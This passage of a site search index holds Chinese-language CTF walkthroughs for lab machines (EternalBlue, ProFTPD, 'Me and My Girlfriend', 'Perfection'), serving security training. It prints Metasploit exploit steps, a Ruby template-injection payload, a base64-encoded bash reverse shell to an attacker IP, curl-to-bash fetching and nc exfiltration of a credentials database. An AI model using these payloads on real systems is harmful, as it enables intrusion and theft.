/usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\nStarting Nmap 7.94 ( https://nmap.org ) at 2024-07-31 06:25 CST\n[proxychains] Strict chain  ...  127.0.0.1:9050  ...  timeout\n[proxychains] Strict chain  ...  127.0.0.1:9050  ...  timeout\nNmap scan report for 192.168.33.33\nHost is up (0.00057s latency).                         \n\nPORT     STATE  SERVICE       VERSION\n445/tcp  closed microsoft-ds\n3389/tcp closed ms-wbt-server\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.57 seconds\n</code></pre> <p>\u6ce8\u610f\uff1a\u8fd9\u91cc\u4f7f\u7528proxychains4\u9700\u8981\u914d\u7f6e/etc/proxychains.con</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom/\u684c\u9762]\n\u2514\u2500# cat /etc/proxychains.conf\n# proxychains.conf  VER 3.1\n#\n#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.\n#\n\nstrict_chain\nproxy_dns \ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\nsocks5  172.25.0.13 2001\n</code></pre> <p>\u6211\u4eec\u901a\u8fc7 msfconsole  \u5229\u7528\u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u3002</p> <pre><code>proxychains msfconsole    \nsearch ms17_010\nuse 1\nset payload windows/meterpreter/bind_tcp\nset RHOST 192.168.33.33\nrun\n</code></pre> <p></p> <p>\u4f46\u662f\u592a\u4e0d\u7a33\u5b9a\u4e86\uff0c\u603b\u662f\u8d85\u65f6\u3002</p> <p></p> <pre><code>meterpreter &gt; shell\nC:\\Windows\\system32&gt;net user\nC:\\Windows\\system32&gt;net user Administrator 123\n</code></pre>"},{"location":"CTF/HTB/Linux-Baisc-Pentesting/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Linux-Baisc-Pentesting/index.html#nmap","title":"Nmap","text":"<p>\u5f00\u542fkali\u7528\u626b\u540c\u7f51\u6bb5\uff0c\u627e\u5230\u8be5\u865a\u62df\u673aip\uff0c\u540c\u65f6\u626b\u63cf\u5f00\u653e\u7aef\u53e3\uff1a</p> <pre><code>nmap -sn 192.168.111.0/24\nnmap --min-rate 10000 -p- -Pn  192.168.111.139\nnmap -sT -sC -sV -O -p21,22,80 192.168.111.139 \n</code></pre> <p></p> <p></p> <p></p>"},{"location":"CTF/HTB/Linux-Baisc-Pentesting/index.html#web-80","title":"Web - 80","text":"<p>\u63d0\u793a\u6ca1\u6709\u6dfb\u52a0\u4efb\u4f55\u5185\u5bb9</p>"},{"location":"CTF/HTB/Linux-Baisc-Pentesting/index.html#-fuzz","title":"\u76ee\u5f55 - FUZZ","text":"<pre><code>dirb http://192.168.111.139\n</code></pre> <p>\u65e0\u53ef\u7528\u4fe1\u606f</p>"},{"location":"CTF/HTB/Linux-Baisc-Pentesting/index.html#port-21","title":"PORT - 21","text":"<pre><code>PORT   STATE SERVICE VERSION\n21/tcp open  ftp     ProFTPD 1.3.3c\n</code></pre> <p>Google\u641c\u7d22\u53d1\u73b0\u5b58\u5728\u6f0f\u6d1e\uff0c\u6211\u4eec\u4f7f\u7528msf\u8fdb\u884c\u5229\u7528\u3002</p>"},{"location":"CTF/HTB/Linux-Baisc-Pentesting/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<pre><code>msfconsole\nsearch ProFTPd-1.3.3c\n</code></pre> <pre><code>use 0\nshow options\nset RHOSTS 192.168.111.139    //\u8bbe\u7f6eRHOSTS\u4e3a\u9776\u673aip\u5730\u5740\nset payload cmd/unix/reverse\nset LHOST 192.168.111.128    //\u8bbe\u7f6e\u76d1\u542cip\u4e3akali\u7684IP\n</code></pre> <pre><code>exploit\n</code></pre> <p>\u653b\u51fb\u6210\u529f\uff0c\u6210\u529f\u62ff\u5230root\u6743\u9650</p>"},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html","title":"Me and My Girlfriend","text":"<p>\u4e0b\u8f7d\u5730\u5740https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/   \u3002\u5728\u8fd9\u91cc\u9009\u62e9\u4e0b\u8f7d\u955c\u50cf\u6587\u4ef6</p> <p></p> <p>\u6253\u5f00\u865a\u62df\u673a\u8bbe\u7f6e\uff0c\u5c06\u7f51\u7edc\u8bbe\u4e3aNAT\u6a21\u5f0f\uff0c\u8fd9\u6837\u9776\u673a\u548ckali\u5728\u540c\u4e00\u7f51\u6bb5\u4e0b.\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9\u5305\u62ecx-forwarded-for\u4e3b\u673a\u5934\u8f6c\u53d1\u3001 \u624b\u5de5\u7206\u5e93\u3001sudo php\u63d0\u6743</p>"},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html#_1","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html#nmap","title":"Nmap","text":"<p>\u5f00\u542fkali\u7528\u626b\u540c\u7f51\u6bb5\uff0c\u627e\u5230\u8be5\u865a\u62df\u673aip\uff0c\u540c\u65f6\u626b\u63cf\u5f00\u653e\u7aef\u53e3\uff1a</p> <pre><code>nmap -sn 192.168.111.0/24\nnmap --min-rate 10000 -p- -Pn  192.168.111.137\n</code></pre> <p></p> <p>\u83b7\u5f97\u9776\u673aip\uff1a192.168.111.137</p> <p>\u5f00\u653e\u7aef\u53e3\uff1a22\u300180\u7b49\u7aef\u53e3\uff0c\u662fApache\u670d\u52a1\u5668</p>"},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html#port-80","title":"Port - 80","text":"<p>\u770b\u6765\u662f\u53ea\u80fd\u4ece80\u7aef\u53e3Web\u5165\u624b\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\u9776\u673aip\uff0c\u663e\u793a\u5982\u4e0b\uff1a</p> <p></p> <p>\u8fd9\u9875\u9762\u63d0\u793a\u6211\u4eec\uff0c\u7ad9\u70b9\u53ea\u80fd\u672c\u5730local\u8bbf\u95ee\uff0c\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p> <p>\u63d0\u793a\u6211\u4eec\u5e94\u8be5\u7814\u7a76\u4ee5\u4e0b\u5982\u4f55\u4f7f\u7528x-forwarded-for\uff0c X-Forwarded-For\uff08XFF\uff09\u662f\u7528\u6765\u8bc6\u522b\u901a\u8fc7HTTP\u4ee3\u7406\u6216\u8d1f\u8f7d\u5747\u8861\u65b9\u5f0f\u8fde\u63a5\u5230Web\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u6700\u539f\u59cb\u7684IP\u5730\u5740\u7684HTTP\u8bf7\u6c42\u5934\u5b57\u6bb5\uff0c\u6362\u53e5\u8bdd\u5c31\u662f\u65e0\u8bba\u4f60\u7528\u4e86\u591a\u5c11\u5c42\u4ee3\u7406\uff0cXFF\u5934\u90fd\u80fd\u7ed9\u4f60\u663e\u793a\u51fa\u6bcf\u5c42\u4ee3\u7406\u548c\u539f\u59cbip\uff0c\u5982\u679c\u6ca1\u6709XFF\u6216\u8005\u53e6\u5916\u4e00\u79cd\u76f8\u4f3c\u7684\u6280\u672f\uff0c\u6240\u6709\u901a\u8fc7\u4ee3\u7406\u670d\u52a1\u5668\u7684\u8fde\u63a5\u53ea\u4f1a\u663e\u793a\u4ee3\u7406\u670d\u52a1\u5668\u7684IP\u5730\u5740\uff0c\u800c\u975e\u8fde\u63a5\u53d1\u8d77\u7684\u539f\u59cbIP\u5730\u5740\uff0c\u8fd9\u6837\u7684\u4ee3\u7406\u670d\u52a1\u5668\u5b9e\u9645\u4e0a\u5145\u5f53\u4e86\u533f\u540d\u670d\u52a1\u63d0\u4f9b\u8005\u7684\u89d2\u8272\uff0c\u5982\u679c\u8fde\u63a5\u7684\u539f\u59cbIP\u5730\u5740\u4e0d\u53ef\u5f97\uff0c\u6076\u610f\u8bbf\u95ee\u7684\u68c0\u6d4b\u4e0e\u9884\u9632\u7684\u96be\u5ea6\u5c06\u5927\u5927\u589e\u52a0\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u5c31\u6dfb\u52a0\u4e00\u4e2aXFF\u5934\u90e8\uff0c\u5185\u5bb9\u5199localhost\u8868\u793a\u672c\u5730\uff0c\u4e5f\u5c31\u662f\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e2d\u6dfb\u52a0\u5982\u4e0b\u4e00\u884c\uff1a<code>x-forwarded-for:localhost</code></p> <p>\u7528burpsuit\u62e6\u622a\u8bf7\u6c42\uff0c\u7136\u540e\u6539\u5305\u6dfb\u52a0x-forwarded-for:localhost\u5373\u53ef\u8bbf\u95ee\uff1a</p> <p></p> <p>\u8bbf\u95ee<code>?page=index</code></p> <p></p> <p></p> <p>\u4f46\u5982\u679c\u6bcf\u6b21\u8bf7\u6c42\u9875\u9762\u90fd\u8981\u624b\u52a8\u6dfb\u52a0<code>x-forwarded-for:localhost</code>\u8fd8\u662f\u633a\u9ebb\u70e6\u7684\u4e00\u4ef6\u4e8b\u3002\u56e0\u6b64\u53ef\u4ee5\u5728BurpSuite\u4ee3\u7406proxy\u6a21\u5757\u4e2d\u7684Options\u9009\u9879\u7684Match and Replace\u6dfb\u52a0\u4e00\u6761\u89c4\u5219\uff1a</p> <p>\u70b9\u51fbAdd\uff0c\u5c06\u8bf7\u6c42\u5934\u4e2d\u589e\u52a0x-forwarded-for:localhost\u5373\u53ef\uff0c\u8fd9\u6837\u6bcf\u6b21\u8bf7\u6c42\u65f6\u90fd\u4f1a\u6dfb\u52a0\u8fd9\u4e00\u884c\uff0c\u5c31\u65e0\u9700\u6bcf\u6b21\u8bf7\u6c42\u90fd\u624b\u52a8\u6dfb\u52a0\u4e86</p> <p></p>"},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html#_2","title":"\u6570\u636e\u5e93\u624b\u5de5\u679a\u4e3e","text":"<p>\u73b0\u5728\u89c2\u5bdfweb\u9875\u9762\uff0cCeban Corp\u6b63\u662f\u9776\u673a\u63cf\u8ff0\u4e2dAlice\u7684\u516c\u53f8\u540d\u79f0\u3002\u8fd9\u4e2a\u754c\u9762\u5176\u5b9e\u6ca1\u592a\u591a\u4fe1\u606f\uff0cLogin\u662f\u767b\u5f55\u754c\u9762\uff0c\u9700\u8981\u6709\u8d26\u53f7\u548c\u5bc6\u7801\u3002</p> <p></p> <p>Register\u662f\u6ce8\u518c\u754c\u9762\uff0c\u5982\u4e0b\uff0c\u5e72\u8106\u5c31\u968f\u4fbf\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u8bd5\u8bd5\uff1a</p> <p></p> <p>\u6211\u8fd9\u91cc\u6ce8\u518c\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u90fd\u662fqwe\uff0c\u6ce8\u518c\u5b8c\u6210\u4e4b\u540eLogin\uff0c\u767b\u5f55\u6210\u529f\uff1a</p> <p></p> <p>\u6ce8\u610furl\u4e2d\u6709\u4e00\u4e2a<code>user_id=12</code>\uff0c\u8fd9\u4f30\u8ba1\u662f\u4e00\u4e2a\u67e5\u8be2\uff0c\u6211\u4eec\u5c1d\u8bd5\u80fd\u4e0d\u80fd\u76f4\u63a5\u4fee\u6539\u8fd9\u4e2auser_id\uff0c\u5b9e\u73b0\u5bf9\u5176\u4ed6\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u7684\u67e5\u770b\uff1a</p> <p></p> <p>\u5c06 user_id\u6539\u4e3a1\u540e\uff0c\u6210\u529f\u770b\u5230\u4e86\u5176\u4ed6\u8d26\u53f7\uff0c\u90a3\u6211\u4eec\u624b\u5de5\u66f4\u6362user_id\u4e3a1\u523011\uff0c\u770b\u770b\u6709\u54ea\u4e9b\u51ed\u636e\uff0c\u91cd\u70b9\u770b\u6709\u6ca1\u6709\u8d26\u53f7\u4e3aalice\uff08\u9776\u673a\u63cf\u8ff0\u7684\u63d0\u793a\uff09\uff0c\u679c\u7136\u627e\u5230\u4e86\uff0c\u5f53user_id=5\u65f6\uff0c\u662fAlice\u7684\u51ed\u636e\uff1a</p> <p></p> <p>\u8fd9\u5bc6\u7801\u90fd\u662f\u524d\u7aef\u660e\u6587\u663e\u793a\u7684\uff0calice\u8d26\u53f7\u7684\u5bc6\u7801\u662f4lic3 \uff0c\u6211\u4eec\u5c1d\u8bd5\u7528ssh\u767b\u5f55\uff0c\u5982\u679c\u6570\u636e\u5e93\u5bc6\u7801\u548cssh\u5bc6\u7801\u4e00\u81f4\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u6210\u529fssh\uff0c\u5982\u4e0b\u56fe\uff0c\u649e\u5e93\u6210\u529f\u4e86\uff01</p> <p></p>"},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html#sudo-php","title":"sudo php\u63d0\u6743","text":"<p>\u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u7cfb\u7edf\u4e2d\u6709\u54ea\u4e9b\u4f7f\u7528 sudo \u6267\u884c\u547d\u4ee4\u7684\u6743\u9650</p> <pre><code>sudo -l\n</code></pre> <p></p> <p></p> <p>\u63d0\u6743\u5b8c\u6bd5\u3002</p> <p></p>"},{"location":"CTF/HTB/Linux-Me-and-My-Girlfriend/index.html#_3","title":"\u603b\u7ed3\u4e0e\u601d\u8003","text":"<p>1.\u4e3b\u673a\u53d1\u73b0\u548c\u7aef\u53e3\u626b\u63cf\uff0c\u786e\u5b9a\u5165\u624b\u70b9\u57fa\u672c\u4e0a\u662f80\u3002 2.Web\u6e17\u900f\uff0c\u76f4\u63a5\u6d4f\u89c8\u5668\u8bbf\u95ee\u9776\u673a\u65e0\u6cd5\u663e\u793a\u5185\u5bb9\uff0c\u63d0\u793a\u6211\u4eec\u4fee\u6539XFF\u5934\u90e8\u672c\u5730\u8bbf\u95ee\uff0c\u4e8e\u662f\u7528BurpSuite\u6539\u5305\u5728\u8bf7\u6c42\u5934\u6dfb\u52a0x-forwarded-for:localhost\u5373\u53ef\u8bbf\u95ee\u3002 3.\u6570\u636e\u5e93\u624b\u5de5\u679a\u4e3e\uff0c\u6ce8\u518c\u8d26\u53f7\u767b\u5f55\u540e\uff0c\u53d1\u73b0url\u4e2d\u5b58\u5728user_id\uff0c\u6000\u7591\u8fd9\u91cc\u662f\u5426\u662f\u6570\u636e\u5e93\u76f4\u63a5\u67e5\u8be2\u7684\u4f20\u53c2\uff0c\u76f4\u63a5\u79c0\u560euser_id\u53d1\u73b0\u53ef\u4ee5\u627e\u5230alice\u7684\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u5c1d\u8bd5\u649e\u5e93\u767b\u5f55ssh\uff0c\u6210\u529f\u3002 4.sudo -l\u679a\u4e3esudo\u6743\u9650\u7684\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u53d1\u73b0\u6709php\uff0c\u76f4\u63a5\u7528php\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u542f\u52a8shell\u5373\u53ef\u63d0\u6743\u3002</p>"},{"location":"CTF/HTB/Linux-Perfection/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Linux-Perfection/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.11.253 -oA scans/ports\n...\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx\n...\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5f00\u653e\u4e8622,80\u7aef\u53e3\uff0c22\u7aef\u53e3\u7684\u6e17\u900f\u4f18\u5148\u7ea7\u80af\u5b9a\u8981\u9760\u540e\uff0c\u5148\u770b\u770b80\u7aef\u53e3\uff0c\u7528dirsearch\u6765\u626b\u63cf\u4e00\u4e0b\u7f51\u7ad9\u76ee\u5f55\u770b\u770b\u80fd\u4e0d\u80fd\u7206\u51fa\u6709\u7528\u4fe1\u606f\u51fa\u6765</p>"},{"location":"CTF/HTB/Linux-Perfection/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<pre><code>root@kali# dirsearch -u http://10.10.11.253\n...\n[13:54:48] Starting: \n[13:55:28] 200 -    4KB - /about\n...\n</code></pre>"},{"location":"CTF/HTB/Linux-Perfection/index.html#web","title":"Web\u4fe1\u606f\u6536\u96c6","text":"<p>\u662f\u4e00\u4e2a\u6839\u636e\u6743\u91cd\u8ba1\u7b97\u603b\u6210\u7ee9\u7684\u7f51\u7ad9</p> <p></p> <p>Wappalyzer\u67e5\u770b\u7f51\u9875\u7528\u7684\u4ec0\u4e48\u7f16\u5199\u642d\u5efa\u7684</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u7f51\u7ad9\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f\uff0c\u4f8b\u5982\u4f7f\u7528\u4e86WEBrick1.7.0,\u4ee5\u53ca\u8bed\u8a00\u662fruby\uff0c\u8fd9\u5c31\u627e\u5230\u4e86\u4e24\u4e2a\u6bd4\u8f83\u6709\u7528\u7684\u4fe1\u606f\uff0cWEBrick\u662fruby \u4e2d\u5185\u5d4c\u7684 HTTP \u670d\u52a1\u5668\u7a0b\u5e8f\u5e93\uff0c\u8fd9\u66f4\u52a0\u4f7f\u6211\u4eec\u786e\u5b9a\u4e86\u670d\u52a1\u5668\u662f\u5229\u7528ruby\u8bed\u8a00\u642d\u5efa\u7684\uff0c\u90a3\u4e48\u50cfruby\u3001python\u8fd9\u6837\u7684\u7528\u9ad8\u7ea7\u8bed\u8a00\u642d\u5efa\u7684\u670d\u52a1\u5668\u4e00\u822c\u662f\u5229\u7528\u901a\u7528\u6a21\u677f\u642d\u5efa\u7684\uff0c\u5c31\u4f1a\u6709\u53ef\u80fd\u5b58\u5728SSTI\uff08Server Side Tamplate Injection\uff09\u6f0f\u6d1e\uff0c\u8fd9\u662f\u4e00\u4e2a\u6709\u53ef\u80fd\u7684\u7a81\u7834\u70b9\u3002</p>"},{"location":"CTF/HTB/Linux-Perfection/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":"<p>\u4e0a\u6587\u63d0\u5230\u53ef\u80fd\u5b58\u5728SSTI\u653b\u51fb\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u8981\u53bb\u6d4b\u8bd5\u4e00\u4e0b\u662f\u5426\u5b58\u5728\uff0cSSTI\u548cSQL\u6ce8\u5165\u7684\u539f\u7406\u57fa\u672c\u7c7b\u4f3c\uff0c\u90fd\u662f\u901a\u8fc7\u4f20\u53c2\u6765\u95ed\u5408\u8bed\u53e5\uff0c\u540c\u65f6\u5728\u8bed\u53e5\u5916\u90e8\u6765\u6267\u884c\u6076\u610f\u4ee3\u7801\u9020\u6210RCE\uff08Remote Code Execute\uff09\u653b\u51fb\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u627e\u5230\u4e00\u4e2a\u80fd\u4f20\u53c2\u7684\u5730\u65b9\uff0c\u800c\u8fd9\u4e2a\u7f51\u7ad9\u662f\u4e00\u4e2a\u7f51\u9875\u8ba1\u7b97\u5668\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u901a\u8fc7\u5f80\u91cc\u8f93\u5165\u6076\u610f\u4ee3\u7801\u6765\u6d4b\u8bd5\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\uff0c\u4e8e\u662f\u6211\u4eec\u8f93\u5165\u4ee5\u4e0b\u4fe1\u606f</p> <p></p> <p>\u5c1d\u8bd5\u53ef\u80fd\u7684Ruby\u7684\u6a21\u677f\uff1a</p> <p>SSTI (Server Side Template Injection) | HackTricks | HackTricks</p> <p></p> <p></p> <p>\u63d0\u793amalicous input\uff0c\u8bf4\u660e\u6211\u4eec\u6709\u8bed\u53e5\u89e6\u53d1\u5173\u952e\u8bcd\u9ed1\u540d\u5355\u4e86\uff0c\u4e8e\u662f\u6211\u4eec\u4f7f\u7528burp\u6293\u5305\u770b\u80fd\u4e0d\u80fd\u89e3\u51b3\u95ee\u9898</p> <p></p> <pre><code>aaa\n&lt;%=+File.open('/etc/passwd').read+%&gt;\n</code></pre> <ul> <li> <p>%0A\u662f\u622a\u65ad\u7b26\u53f7\uff0c\u5b83\u53ef\u4ee5\u4f7fbash\u5728\u8bfb\u53d6\u4ee3\u7801\u65f6\u8bfb\u5230\u8fd9\u4e2a\u7b26\u53f7\u65f6\u505c\u6b62\u8bfb\u53d6\u8fd9\u4e00\u884c\u7684\u540e\u7eed\u4ee3\u7801\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\u63a5\u7740\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801</p> </li> <li> <p>\u5728\u4f20\u53c2\u4e2durl\u7f16\u7801\u4f1a\u81ea\u52a8\u5ffd\u7565\u7a7a\u683c\u8981\u7528\u201c+\u201d\u6765\u4ee3\u66ff\u4e0a\u8ff0\u8bed\u53e5</p> </li> <li>\u5c06payload\u4f7f\u7528base64\u7f16\u7801\u6765\u8fdb\u884c\u5d4c\u5957\uff0c\u4e3a\u4e86\u907f\u514d\u540e\u9762\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u5173\u952e\u5b57\u8fc7\u6ee4</li> </ul>"},{"location":"CTF/HTB/Linux-Perfection/index.html#shell","title":"\u53cd\u5f39shell","text":"<p>\u9996\u5148\u662f\u786e\u5b9a\u57fa\u672cpayload\u8bed\u53e5</p> <pre><code>#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.88/6666 0&gt;&amp;1\n</code></pre> <p>\u4e8e\u662f\u4e3a\u4e86payload\u987a\u5229\u6267\u884c\uff0c\u4e5f\u4e3a\u4e86\u907f\u514d\u540e\u9762\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u5173\u952e\u5b57\u8fc7\u6ee4\uff0c\u6211\u4eec\u76f4\u63a5\u5c06payload\u4f7f\u7528base64\u7f16\u7801\u6765\u8fdb\u884c\u5d4c\u5957\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u53cd\u5f39shell\u7684\u5e38\u7528\u624b\u6bb5</p> <p></p> <p></p> <p>\u8fd9\u91cc\u5f88\u5947\u602a\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u628apayload\u7f16\u7801\u4e3abase64\u4f1a\u65e0\u6cd5\u6267\u884c\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u4ece\u201c-i\u201d\u8fd9\u4e2a\u5730\u65b9\u628apayload\u5206\u5f00\u6765\u7f16\u7801\u518d\u62fc\u5728\u4e00\u8d77\u5c31\u53ef\u4ee5\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u5982\u4e0bpayload\uff08base64\u683c\u5f0f\uff09</p> <pre><code>IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTQuODgvODg2NiAwPiYxIA==\n</code></pre> <p>\u8fd9\u5c31\u662f\u6700\u7ec8\u7684payload\u4e86\uff0c\u518d\u4ee3\u5165post\u6570\u636e\u5305\u4e2d</p> <pre><code>category1=aaa%0a&lt;%25=system(\"echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTQuODgvODg2NiAwPiYxIA==|+base64+-d+|+bash\");%25&gt;;&amp;grade1=1&amp;weight1=20&amp;category2=bb&amp;grade2=1&amp;weight2=20&amp;category3=cc&amp;grade3=1&amp;weight3=20&amp;category4=dd&amp;grade4=1&amp;weight4=20&amp;category5=ee&amp;grade5=1&amp;weight5=20\n</code></pre> <p>\u7136\u540e\u5f00\u542f\u4e00\u4e2a\u7ec8\u7aef\u8f93\u5165</p> <pre><code>nc -nlvp 8866\n</code></pre> <p></p> <p>shell\u6210\u529f\u53cd\u5f39\uff01</p>"},{"location":"CTF/HTB/Linux-Perfection/index.html#_3","title":"\u63d0\u6743","text":"<pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p>\u8be5\u547d\u4ee4\u7528\u6765\u67e5\u627e\u5728linux\u7cfb\u7edf\u4e2d\u62e5\u6709suid\u6743\u9650\u4f4d\u7684\u6587\u4ef6\uff0cSetUID\uff08Set User ID\uff09\u662f\u4e00\u79cd\u6743\u9650\u4f4d\uff0c\u5b83\u5141\u8bb8\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5728\u6267\u884c\u65f6\u4e34\u65f6\u4ee5\u6587\u4ef6\u6240\u6709\u8005\u7684\u6743\u9650\u8fd0\u884c\uff0c\u800c\u4e0d\u662f\u6267\u884c\u8005\u7684\u6743\u9650\u3002\u901a\u8fc7\u8bbe\u7f6eSetUID\u6743\u9650\u4f4d\uff0c\u666e\u901a\u7528\u6237\u53ef\u4ee5\u5728\u6267\u884c\u7279\u6743\u547d\u4ee4\uff08\u5982\u7cfb\u7edf\u7ba1\u7406\u5458\u7684\u547d\u4ee4\uff09\u65f6\u83b7\u5f97\u76f8\u5e94\u7684\u7279\u6743\u3002</p> <p></p> <p>\u597d\u50cf\u4e5f\u6ca1\u6709\u4ec0\u4e48\u53ef\u4ee5\u5229\u7528\u7684\uff0c\u4f20\u5165linpeas\u770b\u770b\u63d0\u6743\u5427\uff0c\u5728\u6709linpeas.sh\u7684\u6587\u4ef6\u5939\u4e0b\u7528python\u5f00\u542fhttp\u670d\u52a1</p> <p>GitHub\u94fe\u63a5\uff1ahttps://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</p> <p>LinPEAS \u662f\u4e00\u4e2a\u6ca1\u6709\u4efb\u4f55\u4f9d\u8d56\u7684\u811a\u672c\uff0c\u5b83\u4f7f\u7528/bin/sh\u8bed\u6cd5\uff0c\u7528\u4e8e\u641c\u7d22\u5728 Linux/Unix*/MacOS \u4e3b\u673a\u4e0a\u641c\u7d22\u53ef\u80fd\u7684\u6743\u9650\u63d0\u5347\u8def\u5f84\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cLinPEAS \u4e0d\u4f1a\u5411\u78c1\u76d8\u5199\u5165\u4efb\u4f55\u5185\u5bb9\uff0c\u4e5f\u4e0d\u4f1a\u5c1d\u8bd5\u4ee5\u4efb\u4f55\u5176\u4ed6\u7528\u6237\u8eab\u4efd\u4f7f\u7528 su \u3002</p> <p>\u8be5\u811a\u672c\u5de5\u5177\u679a\u4e3e\u5e76\u641c\u7d22\u4e3b\u673a\u5185\u90e8\u53ef\u80fd\u7684\u9519\u8bef\u914d\u7f6e\uff08\u5df2\u77e5\u6f0f\u6d1e\u3001\u7528\u6237\u3001\u8fdb\u7a0b\u548c\u6587\u4ef6\u6743\u9650\u3001\u7279\u6b8a\u6587\u4ef6\u6743\u9650\u3001\u53ef\u8bfb/\u53ef\u5199\u6587\u4ef6\u3001\u66b4\u529b\u7834\u89e3\u5176\u4ed6\u7528\u6237\uff08top1000pwds\uff09\u3001\u5bc6\u7801\u2026\uff09\uff0c\u5e76\u7528\u989c\u8272\u7a81\u51fa\u663e\u793a\u53ef\u80fd\u7684\u9519\u8bef\u914d\u7f6e\u3002</p> <pre><code>python3 -m http.server 1234 -d ./\n</code></pre> <p>\u7136\u540e\u5728\u9776\u673a\u4e0a\u8bbf\u95ee\u6211\u4eec\u7684\u7aef\u53e3\u6765\u6267\u884clinpeas.sh</p> <pre><code>cd /tmp | curl http://10.10.11.253:1234/linpeas.sh | bash\n</code></pre> <p></p>"},{"location":"CTF/HTB/Linux-Perfection/index.html#db","title":"db\u6587\u4ef6\u6cc4\u9732","text":"<p>\u8fd9\u91cc\u770b\u5230\u7206\u51fa\u4e86\u4e00\u4e2adb\u6587\u4ef6,\u6211\u4eec\u628a\u5b83\u4e0b\u8f7d\u4e0b\u6765\u770b\u770b,\u6211\u4eec\u5229\u7528nc\u6765\u4f20\u8f93</p> <pre><code>\u672c\u673a:nc -nlvp 1111 &gt; test.db\n\u9776\u673a:nc 10.10.11.253 1111 &lt; pupilpath_credentials.db\n</code></pre> <p></p>"},{"location":"CTF/HTB/Linux-Perfection/index.html#hashcat","title":"Hashcat\u7834\u89e3\u5bc6\u7801","text":"<p>\u6709\u82e5\u5e72\u4e2a\u7528\u6237\u540d\u4ee5\u53ca\u5bc6\u7801\uff0c\u5c06\u4ed6\u4eec\u653e\u5165john\u67e5\u770b\u662f\u5426\u80fd\u591f\u7834\u89e3</p> <p></p> <p>\u7834\u89e3\u5931\u8d25\uff0c\u53ef\u80fd\u662f\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u5bf9\uff0c\u7ee7\u7eed\u67e5\u627e\u654f\u611f\u4fe1\u606f\uff0c\u53d1\u73b0\u5728/var/spool/mail\u4e2d\u6709\u4e00\u6bb5\u5173\u4e8e\u5bc6\u7801\u7684\u63d0\u793a</p> <p></p> <p>\u5927\u6982\u610f\u601d\u5c31\u662f\u9700\u8981\u7528\u6237\u81ea\u5df1\u91cd\u7f6e\u5bc6\u7801\uff0c\u91cd\u7f6e\u7684\u683c\u5f0f\u4e3a{\u540d\u5b57_\u540d\u5b57\u7684\u9006\u5e8f_\u5728(1,1000000000)\u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u6570}\uff0c\u5c1d\u8bd5\u4f7f\u7528hashcat\u7684\u63a9\u7801\u7206\u7834\u529f\u80fd\u7834\u89e3</p> <pre><code>hashcat -m 1400 -a 3 